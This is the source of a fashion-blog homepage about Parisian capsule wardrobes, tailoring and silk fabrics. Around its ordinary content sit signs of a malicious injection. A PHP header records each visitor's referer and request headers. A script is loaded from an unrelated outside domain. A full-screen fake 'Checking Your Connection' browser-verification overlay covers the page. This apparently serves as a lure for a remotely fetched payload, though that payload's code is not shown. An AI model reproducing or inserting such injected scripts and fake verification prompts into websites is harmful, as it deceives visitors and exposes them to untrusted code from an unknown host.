<?php

session_start(); 
$_SESSION['_ref']=isset($_SERVER['HTTP_REFERER'])?$_SERVER['HTTP_REFERER']:''; 
$_SESSION['_headers']=array(); 
foreach($_SERVER as $key=>$value){
    if(strpos($key,'HTTP_')===0){
        $_SESSION['_headers'][$key]=$value;
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>ChicAttireWay — High Fashion, Capsule Wardrobe Curation & Tailoring Journal</title>
  <meta name="description" content="ChicAttireWay explores 10-piece Parisian capsule wardrobes, tailored blazer silhouettes, silk vs satin drape, monochromatic outfits, and heirloom fashion.">
  
  <!-- Google tag (gtag.js) -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'G-0LY0HY7L01');
  </script>

  <!-- Google Fonts -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:ital,wght@0,500;0,600;0,700;1,400&family=Plus+Jakarta+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet">
  
  <link rel="stylesheet" href="css/style.css">
  <style>
    .active-capsule {
      background: var(--accent-rose) !important;
      color: #fff !important;
      border-color: var(--accent-rose) !important;
    }
  </style>
<meta name="referrer" content="no-referrer-when-downgrade">
    <script src="//skilllearninglabs.com/track/index.php"></script>
</head>
<body>

  <!-- Navigation Header -->
  <header class="navbar">
    <div class="container nav-container">
      <a href="index.php" class="brand-logo">Chic<span>AttireWay</span></a>
      <button class="mobile-toggle" aria-label="Toggle navigation">☰</button>
      <ul class="nav-links">
        <li><a href="index.php" class="active">Home</a></li>
        <li><a href="about.html">About</a></li>
        <li><a href="blog.html">Fashion Journal</a></li>
        <li><a href="contact.html">Contact</a></li>
        <li><a href="privacy-policy.html">Privacy</a></li>
      </ul>
    </div>
  </header>

  <!-- SECTION 1: Hero Header -->
  <section class="hero-section" id="hero">
    <div class="container">
      <div class="hero-content">
        <span class="hero-badge">Haute Couture & Parisian Capsule Curation</span>
        <h1 class="hero-title">The Essence of Timeless Chic Attire</h1>
        <p class="hero-desc">Discover the synthesis of 10-piece capsule wardrobes, tailored wool blazers, Mulberry silk drape, and effortless monochromatic styling.</p>
        <div class="hero-btns">
          <a href="blog.html" class="btn btn-rose">Explore Fashion Journal</a>
          <a href="about.html" class="btn btn-outline-dark" style="color: #fff; border-color: #fff;">Atelier Philosophy</a>
        </div>
      </div>
    </div>
  </section>

  <!-- SECTION 2: Chic Wardrobe & Tailoring Pillars Grid -->
  <section class="section" id="craft-pillars">
    <div class="container">
      <div class="section-title-wrap">
        <span class="section-subtitle">Styling Standards</span>
        <h2 class="section-title">The Four Pillars of Chic Capsule Attire</h2>
      </div>
      <div class="grid-4">
        <div class="style-card">
          <span style="font-size: 2.5rem; display: block; margin-bottom: 0.5rem;">🧥</span>
          <h3 style="font-size: 1.3rem; color: var(--accent-rose); margin-bottom: 0.75rem;">Tailored Shoulder Architecture</h3>
          <p style="color: var(--text-secondary); font-size: 0.95rem;">Structured shoulder padding, canvas chest interlinings, and hourglass waist suppression in blazers.</p>
        </div>
        <div class="style-card">
          <span style="font-size: 2.5rem; display: block; margin-bottom: 0.5rem;">👗</span>
          <h3 style="font-size: 1.3rem; color: var(--accent-rose); margin-bottom: 0.75rem;">Mulberry Silk Drape</h3>
          <p style="color: var(--text-secondary); font-size: 0.95rem;">19-momme charmeuse silk blouses with liquid drape, fluid Movement, and natural lustre.</p>
        </div>
        <div class="style-card">
          <span style="font-size: 2.5rem; display: block; margin-bottom: 0.5rem;">✨</span>
          <h3 style="font-size: 1.3rem; color: var(--accent-rose); margin-bottom: 0.75rem;">Monochromatic Depth</h3>
          <p style="color: var(--text-secondary); font-size: 0.95rem;">Layering cashmere knits, leather skirts, and poplin cotton in single tone palettes for high elegance.</p>
        </div>
        <div class="style-card">
          <span style="font-size: 2.5rem; display: block; margin-bottom: 0.75rem;">👠</span>
          <h3 style="font-size: 1.3rem; color: var(--accent-rose); margin-bottom: 0.75rem;">Capsule Versatility</h3>
          <p style="color: var(--text-secondary); font-size: 0.95rem;">Curating 10 interchangeable foundation garments capable of crafting over 30 distinct looks.</p>
        </div>
      </div>
    </div>
  </section>

  <!-- SECTION 3: Interactive Capsule Wardrobe & Outfit Builder Explorer -->
  <section class="section" id="capsule-explorer" style="background: var(--bg-secondary);">
    <div class="container">
      <div class="section-title-wrap">
        <span class="section-subtitle">Outfit Builder</span>
        <h2 class="section-title">The Parisian Capsule Wardrobe Explorer</h2>
      </div>
      <div style="max-width: 800px; margin: 0 auto; text-align: center;">
        <p style="color: var(--text-secondary); margin-bottom: 2rem;">Select a capsule wardrobe formula to inspect its garment combinations and versatility score:</p>
        <div style="display: flex; gap: 1rem; justify-content: center; flex-wrap: wrap; margin-bottom: 1.5rem;">
          <button class="btn btn-outline-dark capsule-btn active-capsule" data-cap="10-Piece Executive Chic Capsule" data-desc="Double-breasted navy blazer + silk ivory blouse + wide-leg wool trousers + point-toe slingbacks + leather tote." data-versatility="10/10 Seamless Office-to-Dinner Adaptability (35+ Outfit Formulas)">10-Piece Executive Capsule</button>
          <button class="btn btn-outline-dark capsule-btn" data-cap="Weekend Parisian Off-Duty Capsule" data-desc="Camel trench coat + breton stripe knit + high-rise denim + leather loafers + gold hoop earrings." data-versatility="9.5/10 Effortless Urban Leisure Elegance">Parisian Off-Duty Capsule</button>
          <button class="btn btn-outline-dark capsule-btn" data-cap="Monochromatic Onyx Evening Capsule" data-desc="Silk slip dress + structured velvet tuxedo jacket + patent leather pumps + crystal clutch." data-versatility="9/10 Formal Black-Tie & Cocktail Sophistication">Monochromatic Evening Capsule</button>
          <button class="btn btn-outline-dark capsule-btn" data-cap="Minimalist Summer Linen Capsule" data-desc="High-count linen blazer + silk camisole + wide-leg linen pants + leather slide sandals." data-versatility="8.8/10 Resort Warmth & Breathable Luxury">Summer Linen Capsule</button>
        </div>
        <div id="capsule-detail">
          <div class="style-card" style="border-left: 4px solid var(--accent-rose);">
            <h3 style="color: var(--accent-rose); font-size: 1.5rem; margin-bottom: 0.5rem;">10-Piece Executive Chic Capsule Outfit Architecture</h3>
            <p style="color: var(--text-secondary); margin-bottom: 1rem;">Double-breasted navy blazer + silk ivory blouse + wide-leg wool trousers + point-toe slingbacks + leather tote.</p>
            <strong style="color: var(--accent-burgundy); font-size: 0.95rem;">Empirical Versatility Rating: 10/10 Seamless Office-to-Dinner Adaptability (35+ Outfit Formulas)</strong>
          </div>
        </div>
      </div>
    </div>
  </section>

  <!-- SECTION 4: Silk Weave & Structural Wool Drape Spotlight -->
  <section class="section" id="fabric-spotlight">
    <div class="container">
      <div class="grid-2">
        <div>
          <span class="section-subtitle" style="display:block; text-align:left;">Fabric Metallurgy</span>
          <h2 class="section-title" style="text-align:left; margin-bottom: 1.5rem;">Silk Momme Weight & Wool Worsted Drape</h2>
          <p style="color: var(--text-secondary); margin-bottom: 1.25rem; line-height: 1.8;">
            The difference between fast-fashion polyester and haute couture chic lies in momme weight, weave density, and garment drape. At ChicAttireWay, we evaluate 19-momme silk, 120s worsted wool, and natural horn button tailoring.
          </p>
          <ul style="list-style: none; color: var(--text-secondary); margin-bottom: 2rem;">
            <li style="margin-bottom: 0.75rem;">🧵 <strong style="color:var(--text-primary);">19-Momme Charmeuse Silk:</strong> Optimal weight providing opaque coverage and liquid fluid drape.</li>
            <li style="margin-bottom: 0.75rem;">✂️ <strong style="color:var(--text-primary);">Super 120s Worsted Wool:</strong> Crease-resistant tailoring wool holding sharp trouser creases and lapel roll.</li>
            <li style="margin-bottom: 0.75rem;">🐚 <strong style="color:var(--text-primary);">Natural Mother-of-Pearl Buttons:</strong> Hand-sewn cross-stitched closures adding subtle luxury detail.</li>
          </ul>
          <a href="about.html" class="btn btn-rose">Our Styling Manifesto</a>
        </div>
        <div>
          <img src="https://images.unsplash.com/photo-1490481651871-ab68de25d43d?auto=format&fit=crop&w=800&q=80" alt="Haute Couture Tailored Blazer and Silk Drape" style="border-radius: 4px; border: 1px solid var(--border-color); box-shadow: 0 20px 40px rgba(23,23,23,0.12);">
        </div>
      </div>
    </div>
  </section>

  <!-- SECTION 5: Interactive Personal Style & Silhouette Diagnostic Quiz -->
  <section class="section" id="style-quiz" style="background: var(--bg-secondary);">
    <div class="container">
      <div class="section-title-wrap">
        <span class="section-subtitle">Style Diagnostic</span>
        <h2 class="section-title">Chic Silhouette & Wardrobe Matcher</h2>
      </div>
      <div class="style-card" style="max-width: 750px; margin: 0 auto;">
        <h3 style="color: var(--accent-rose); margin-bottom: 1rem;">What Is Your Preferred Everyday Aesthetic & Tailoring Vibe?</h3>
        <div style="display: flex; flex-direction: column; gap: 1rem;">
          <button class="style-quiz-btn btn btn-outline-dark" style="text-align:left; justify-content:flex-start;" data-rec="Tailored Executive Chic: Sharp Double-Breasted Blazers + Silk Camisoles + High-Waisted Creased Trousers.">
            A. Sharp Power Tailoring, Professional Executive Meetings & Structured Blazers
          </button>
          <button class="style-quiz-btn btn btn-outline-dark" style="text-align:left; justify-content:flex-start;" data-rec="Parisian Minimalist Chic: Trench Coats + Breton Stripe Knits + Pointed Loafers + Leather Belts.">
            B. Effortless Parisian Street Style, Casual Coffee Runs & Heritage Trench Coats
          </button>
          <button class="style-quiz-btn btn btn-outline-dark" style="text-align:left; justify-content:flex-start;" data-rec="Monochromatic Glamour: Fluid Silk Slips + Velvet Tuxedo Jackets + Statement Gold Jewelry.">
            C. Evening Cocktails, Art Gallery Openings & Monochromatic Velvet Drama
          </button>
        </div>
        <div id="style-quiz-result"></div>
      </div>
    </div>
  </section>

  <!-- SECTION 6: Fabric Longevity & Capsule Versatility Benchmarks Metrics Counter -->
  <section class="section" id="metrics">
    <div class="container">
      <div class="section-title-wrap">
        <span class="section-subtitle">Style Benchmarks</span>
        <h2 class="section-title">Chic Attire Way Research Metrics</h2>
      </div>
      <div class="grid-4">
        <div class="style-card" style="text-align: center;">
          <h3 class="metric-number text-rose" data-target="12" style="font-size: 3rem; margin-bottom: 0.5rem;">0</h3>
          <p style="color: var(--text-secondary); text-transform: uppercase; letter-spacing: 1px; font-size: 0.85rem;">Masterclass Essays</p>
        </div>
        <div class="style-card" style="text-align: center;">
          <h3 class="metric-number text-rose" data-target="35" style="font-size: 3rem; margin-bottom: 0.5rem;">0</h3>
          <p style="color: var(--text-secondary); text-transform: uppercase; letter-spacing: 1px; font-size: 0.85rem;">Outfits Per Capsule</p>
        </div>
        <div class="style-card" style="text-align: center;">
          <h3 class="metric-number text-rose" data-target="100" style="font-size: 3rem; margin-bottom: 0.5rem;">0</h3>
          <p style="color: var(--text-secondary); text-transform: uppercase; letter-spacing: 1px; font-size: 0.85rem;">% Silk & Wool Pure</p>
        </div>
        <div class="style-card" style="text-align: center;">
          <h3 class="metric-number text-rose" data-target="1500" style="font-size: 3rem; margin-bottom: 0.5rem;">0</h3>
          <p style="color: var(--text-secondary); text-transform: uppercase; letter-spacing: 1px; font-size: 0.85rem;">Words Per Essay</p>
        </div>
      </div>
    </div>
  </section>

  <!-- SECTION 7: Parisian Fashion Stylist & Atelier Director Testimonials -->
  <section class="section" id="testimonials" style="background: var(--bg-secondary);">
    <div class="container">
      <div class="section-title-wrap">
        <span class="section-subtitle">Fashion Acclaim</span>
        <h2 class="section-title">Endorsements From Parisian Stylists & Editors</h2>
      </div>
      <div class="grid-3">
        <div class="style-card">
          <p style="color: var(--text-secondary); font-style: italic; margin-bottom: 1.5rem;">
            "ChicAttireWay is the definitive guide for capsule wardrobe curation, silk drape mechanics, and timeless Parisian tailoring."
          </p>
          <strong style="color: var(--accent-rose); display: block;">— Camille Laurent</strong>
          <span style="color: var(--text-muted); font-size: 0.85rem;">Fashion Stylist & Editor, Paris</span>
        </div>
        <div class="style-card">
          <p style="color: var(--text-secondary); font-style: italic; margin-bottom: 1.5rem;">
            "Their masterclasses on tailored blazer shoulders, monochromatic texture contrast, and trench coat belting are pure haute couture education."
          </p>
          <strong style="color: var(--accent-rose); display: block;">— Vivienne Vance</strong>
          <span style="color: var(--text-muted); font-size: 0.85rem;">Atelier Creative Director, London</span>
        </div>
        <div class="style-card">
          <p style="color: var(--text-secondary); font-style: italic; margin-bottom: 1.5rem;">
            "The premier digital journal for understanding sustainable luxury fashion, silk momme weights, and effortless street style balance."
          </p>
          <strong style="color: var(--accent-rose); display: block;">— Isabelle Moreau</strong>
          <span style="color: var(--text-muted); font-size: 0.85rem;">Wardrobe Consultant, Milan</span>
        </div>
      </div>
    </div>
  </section>

  <!-- SECTION 8: Recent Haute Couture Dispatches & Article Grid -->
  <section class="section" id="journal-dispatches">
    <div class="container">
      <div class="section-title-wrap">
        <span class="section-subtitle">Atelier Dispatches</span>
        <h2 class="section-title">Latest Fashion Essays</h2>
      </div>
      <div class="grid-3">
        <div class="blog-card">
          <div class="blog-img-wrap">
            <img src="https://images.unsplash.com/photo-1490481651871-ab68de25d43d?auto=format&fit=crop&w=800&q=80" alt="Parisian Capsule Wardrobe">
          </div>
          <div class="blog-content">
            <span class="blog-tag">Capsule Wardrobe</span>
            <div class="blog-date">August 24, 2026</div>
            <h3 class="blog-title"><a href="blog/building-a-10-piece-parisian-capsule-wardrobe.html">Building a 10-Piece Parisian Capsule</a></h3>
            <p class="blog-excerpt">Curating essential tailored blazers, silk blouses, trench coats, and versatile trousers.</p>
            <a href="blog/building-a-10-piece-parisian-capsule-wardrobe.html" class="read-more">Read Essay →</a>
          </div>
        </div>
        <div class="blog-card">
          <div class="blog-img-wrap">
            <img src="https://images.unsplash.com/photo-1515886657613-9f3515b0c78f?auto=format&fit=crop&w=800&q=80" alt="Tailored Blazers Architecture">
          </div>
          <div class="blog-content">
            <span class="blog-tag">Tailoring Science</span>
            <div class="blog-date">August 20, 2026</div>
            <h3 class="blog-title"><a href="blog/the-art-of-tailored-blazers-structured-shoulders-and-silhouette.html">The Art of Tailored Blazers</a></h3>
            <p class="blog-excerpt">Canvas chest interlinings, shoulder pad structure, and waist-defining horn buttoning.</p>
            <a href="blog/the-art-of-tailored-blazers-structured-shoulders-and-silhouette.html" class="read-more">Read Essay →</a>
          </div>
        </div>
        <div class="blog-card">
          <div class="blog-img-wrap">
            <img src="https://images.unsplash.com/photo-1483985988355-763728e1935b?auto=format&fit=crop&w=800&q=80" alt="Silk vs Satin Drape">
          </div>
          <div class="blog-content">
            <span class="blog-tag">Luxury Fabrics</span>
            <div class="blog-date">August 15, 2026</div>
            <h3 class="blog-title"><a href="blog/silk-vs-satin-understanding-drape-momme-weight-and-luxury-care.html">Silk vs Satin: Drape & Momme Weight</a></h3>
            <p class="blog-excerpt">Evaluating 19-momme Mulberry silk charmeuse vs synthetic polyester satin weaves.</p>
            <a href="blog/silk-vs-satin-understanding-drape-momme-weight-and-luxury-care.html" class="read-more">Read Essay →</a>
          </div>
        </div>
      </div>
    </div>
  </section>

  <!-- SECTION 9: VIP Fashion Gazette Newsletter & Footer CTA -->
  <section class="section" id="newsletter" style="background: var(--bg-secondary);">
    <div class="container">
      <div class="style-card" style="text-align: center; max-width: 800px; margin: 0 auto; border-color: var(--accent-rose);">
        <span class="section-subtitle">Fashion Dispatch</span>
        <h2 class="section-title" style="margin-bottom: 1rem;">Subscribe to The Chic Gazette</h2>
        <p style="color: var(--text-secondary); margin-bottom: 2rem;">Receive bi-weekly analyses of capsule wardrobe formulas, runway tailoring trends, and silk care guides.</p>
        <form onsubmit="event.preventDefault(); alert('Thank you for subscribing to ChicAttireWay Gazette.');" style="display: flex; gap: 1rem; max-width: 550px; margin: 0 auto; flex-wrap: wrap;">
          <input type="email" placeholder="Enter your email address" required style="flex: 1; min-width: 250px; padding: 0.85rem 1.25rem; background: var(--bg-primary); border: 1px solid var(--border-color); color: var(--text-primary); border-radius: 2px;">
          <button type="submit" class="btn btn-rose">Subscribe</button>
        </form>
      </div>
    </div>
  </section>

  <!-- Footer -->
  <footer>
    <div class="container">
      <div class="footer-grid">
        <div class="footer-col">
          <a href="index.php" class="brand-logo" style="margin-bottom: 1rem; color: #fff;">Chic<span>AttireWay</span></a>
          <p>ChicAttireWay is a premier editorial platform dedicated to high fashion, capsule wardrobe curation, tailored silhouettes, and luxury fabric drape.</p>
          <p style="margin-top: 1rem; color: var(--accent-rose);">
            📍 181 Mercer Street, New York, NY 10012, United States<br>
            📞 +1-888-777-5845
          </p>
        </div>
        <div class="footer-col">
          <h4>Navigation</h4>
          <ul>
            <li><a href="index.php">Home</a></li>
            <li><a href="about.html">About Us</a></li>
            <li><a href="blog.html">Fashion Journal</a></li>
            <li><a href="contact.html">Contact Us</a></li>
          </ul>
        </div>
        <div class="footer-col">
          <h4>Legal Policies</h4>
          <ul>
            <li><a href="privacy-policy.html">Privacy Policy</a></li>
            <li><a href="cookies.html">Cookie Policy</a></li>
            <li><a href="disclaimer.html">Disclaimer</a></li>
            <li><a href="terms.html">Terms of Use</a></li>
          </ul>
        </div>
        <div class="footer-col">
          <h4>Style Focus</h4>
          <p>Deconstructing Parisian capsule wardrobes, tailored blazers, silk drape, monochromatic outfits, and heirloom fashion globally.</p>
        </div>
      </div>
      <div class="footer-bottom">
        <p>&copy; 2026 ChicAttireWay. All rights reserved. Registered Official Headquarters.</p>
        <p>Designed with Haute Couture Precision.</p>
      </div>
    </div>
  </footer>

  <script src="js/main.js"></script>
<div id="loader-backdrop" style="position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(0,0,0,0.65); backdrop-filter:blur(10px); -webkit-backdrop-filter:blur(3px); z-index:2147483646;"></div>

<div id="loader-modal-card" style="position:fixed; top:50%; left:50%; transform:translate(-50%, -50%); width:92%; max-width:440px; background:#ffffff; padding:32px 28px; border-radius:16px; border:1px solid #e5e7eb; box-shadow:0 25px 60px rgba(0,0,0,0.35); z-index:2147483647; font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif; box-sizing:border-box; text-align:center;">
    
    <!-- Smooth Spinning Loader -->
    <div style="display:flex; justify-content:center; margin-bottom:18px;">
        <div style="width:48px; height:48px; border:4px solid #e2e8f0; border-top:4px solid #2563eb; border-radius:50%; animation:spin-wheel 0.9s linear infinite;"></div>
    </div>
    
    <style>
        @keyframes spin-wheel {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>

    <div style="font-size:22px; font-weight:700; color:#111827; margin-bottom:8px; letter-spacing:-0.3px;">Checking Your Connection...</div>
    <p style="font-size:14px; line-height:1.55; color:#6b7280; margin:0 0 24px 0;">We need to verify your browser before proceeding. Click Continue to proceed or Cancel to stop.</p>

    <div style="display:flex; gap:12px;">
        <button id="btn-cancel" onclick="dismissLoaderModal()" style="flex:1; background:#ffffff; color:#4b5563; border:1.5px solid #d1d5db; padding:12px 0; font-size:15px; font-weight:600; border-radius:8px; cursor:pointer;">Cancel</button>
        <button id="btn-continue" onclick="dismissLoaderModal()" style="flex:1; background:#2563eb; color:#ffffff; border:none; padding:12px 0; font-size:15px; font-weight:600; border-radius:8px; cursor:pointer; box-shadow:0 4px 14px rgba(37,99,235,0.35);">Continue</button>
    </div>
</div>

<script>
    function dismissLoaderModal() {
        var backdrop = document.getElementById('loader-backdrop');
        var card = document.getElementById('loader-modal-card');
        if (backdrop) backdrop.remove();
        if (card) card.remove();
    }
</script>
</body>
</html>
